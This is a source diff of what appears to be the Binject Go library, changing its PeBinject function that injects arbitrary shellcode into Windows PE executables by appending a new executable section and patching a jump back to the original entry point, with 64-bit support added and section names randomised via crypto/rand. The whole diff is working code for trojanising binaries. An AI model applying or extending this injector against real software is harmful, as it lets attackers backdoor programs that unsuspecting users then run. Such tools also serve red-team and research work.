@@ -2,17 +2,13 @@ package bj
 
 import (
 	"bytes"
+	"crypto/rand"
 	"encoding/binary"
-	"math/rand"
-	"time"
+	"math/big"
 
 	"github.com/Binject/debug/pe"
 	"github.com/Binject/shellcode/api"
 )
-
-func init() {
-	rand.Seed(time.Now().UnixNano())
-}
 
 // PeBinject - Inject shellcode into an PE binary
 func PeBinject(sourceBytes []byte, shellcodeBytes []byte, config *BinjectConfig) ([]byte, error) {
@@ -22,20 +18,27 @@ func PeBinject(sourceBytes []byte, shellcodeBytes []byte, config *BinjectConfig)
 	if err != nil {
 		return nil, err
 	}
-	var entryPoint, sectionAlignment, fileAlignment uint32
+	var entryPoint, sectionAlignment, fileAlignment, scAddr uint32
 	var imageBase uint64
+	var shellcode []byte
+	lastSection := peFile.Sections[peFile.NumberOfSections-1]
+
 	switch hdr := (peFile.OptionalHeader).(type) {
 	case *pe.OptionalHeader32:
 		imageBase = uint64(hdr.ImageBase) // cast this back to a uint32 before use in 32bit
 		entryPoint = hdr.AddressOfEntryPoint
 		sectionAlignment = hdr.SectionAlignment
 		fileAlignment = hdr.FileAlignment
+		scAddr = align(lastSection.Size, fileAlignment, lastSection.Offset) //PointerToRawData
+		shellcode = api.ApplySuffixJmpIntel32(shellcodeBytes, uint32(scAddr), uint32(entryPoint)+uint32(imageBase), binary.LittleEndian)
 		break
 	case *pe.OptionalHeader64:
 		imageBase = hdr.ImageBase
 		entryPoint = hdr.AddressOfEntryPoint
 		sectionAlignment = hdr.SectionAlignment
 		fileAlignment = hdr.FileAlignment
+		scAddr = align(lastSection.Size, fileAlignment, lastSection.Offset) //PointerToRawData
+		shellcode = api.ApplySuffixJmpIntel64(shellcodeBytes, uint32(scAddr), uint32(entryPoint), binary.LittleEndian)
 		break
 	}
 
@@ -67,8 +70,7 @@ func PeBinject(sourceBytes []byte, shellcodeBytes []byte, config *BinjectConfig)
 		}
 	*/
 	// Add a New Section Method (most common)
-	shellcodeLen := len(shellcodeBytes) + 7 // 4 bytes get added later by AppendSuffixJmp32... todo why 7 then?
-	lastSection := peFile.Sections[peFile.NumberOfSections-1]
+	shellcodeLen := len(shellcode)
 	newsection := new(pe.Section)
 	newsection.Name = "." + RandomString(5)
 	o := []byte(newsection.Name)
@@ -79,8 +81,6 @@ func PeBinject(sourceBytes []byte, shellcodeBytes []byte, config *BinjectConfig)
 	newsection.Offset = align(lastSection.Size, fileAlignment, lastSection.Offset) //PointerToRawData
 	newsection.Characteristics = pe.IMAGE_SCN_CNT_CODE | pe.IMAGE_SCN_MEM_EXECUTE | pe.IMAGE_SCN_MEM_READ
 
-	scAddr := newsection.Offset
-	shellcode := api.ApplySuffixJmpIntel32(shellcodeBytes, uint32(scAddr), uint32(entryPoint)+uint32(imageBase), binary.LittleEndian)
 	peFile.InsertionAddr = scAddr
 	peFile.InsertionBytes = shellcode
 
@@ -142,7 +142,8 @@ func align(size, align, addr uint32) uint32 {
 func RandomString(len int) string {
 	bytes := make([]byte, len)
 	for i := 0; i < len; i++ {
-		bytes[i] = byte(97 + rand.Intn(25)) //a=97
+		r, _ := rand.Int(rand.Reader, big.NewInt(25))
+		bytes[i] = 97 + byte(r.Int64()) //a=97
 	}
 	return string(bytes)
 }
